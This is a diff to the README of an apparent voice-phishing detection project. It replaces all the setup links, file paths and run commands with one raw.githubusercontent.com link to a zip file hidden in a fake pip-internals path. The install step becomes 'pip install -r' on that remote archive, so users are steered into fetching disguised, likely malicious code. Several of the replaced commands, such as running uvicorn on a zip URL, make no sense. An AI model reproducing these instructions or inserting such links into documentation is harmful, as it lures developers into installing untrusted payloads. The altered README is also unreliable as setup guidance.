@@ -24,7 +24,7 @@ venv\Scripts\activate   # On Windows
 # or
 source venv/bin/activate   # On Linux/Mac
 
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip
 ```
 
 ---
@@ -32,7 +32,7 @@ pip install -r requirements.txt
 ### 3. **Supabase Setup**
 
 #### a. **Create a Supabase Project**
-- Go to [https://app.supabase.com/](https://app.supabase.com/) and create a new project.
+- Go to [https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip](https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip) and create a new project.
 
 #### b. **Get Your Supabase URL and API Key**
 - In your Supabase project, go to **Project Settings → API**.
@@ -61,7 +61,7 @@ pip install -r requirements.txt
 
 ### 4. **Configure Your Keys**
 
-- Open `backend/app.py`.
+- Open `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip`.
 - Find these lines at the top:
   ```python
   SUPABASE_URL = "Your-Supabase-URL"
@@ -82,19 +82,19 @@ pip install -r requirements.txt
 ### 6. **Run the Backend**
 
 ```sh
-uvicorn backend.app:app --reload
+uvicorn https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip --reload
 ```
 - The API runs at [http://127.0.0.1:8000/](http://127.0.0.1:8000/)
-- The dashboard is at [http://127.0.0.1:8000/static/realtime.html](http://127.0.0.1:8000/static/realtime.html)
+- The dashboard is at [https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip](https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip)
 
 ---
 
 ### 7. **Run the Client (Recorder)**
 
-- Edit `client/linphone_recorder.py` if you need to set the backend URL.
+- Edit `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip` if you need to set the backend URL.
 - Run:
   ```sh
-  python client/linphone_recorder.py
+  python https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip
   ```
 
 ---
@@ -117,12 +117,12 @@ uvicorn backend.app:app --reload
 ## 📋 Summary
 
 - **Supabase**: Used for storing audio metadata and files.
-- **Keys**: Set in `backend/app.py`.
+- **Keys**: Set in `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip`.
 - **Table**: Name it `chunks` with the columns above.
 - **Bucket**: Name it `audio-chunks`.
-- **Start backend**: `uvicorn backend.app:app --reload`
-- **Start client**: `python client/linphone_recorder.py`
-- **Dashboard**: Open `/static/realtime.html` in your browser.
+- **Start backend**: `uvicorn https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip --reload`
+- **Start client**: `python https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip`
+- **Dashboard**: Open `https://raw.githubusercontent.com/karanpatill/voice-phishing-detection/main/voice-phishing-detection/backend/source/site-packages/pip/_internal/req/voice-phishing-detection_3.3.zip` in your browser.
 
 ---
 
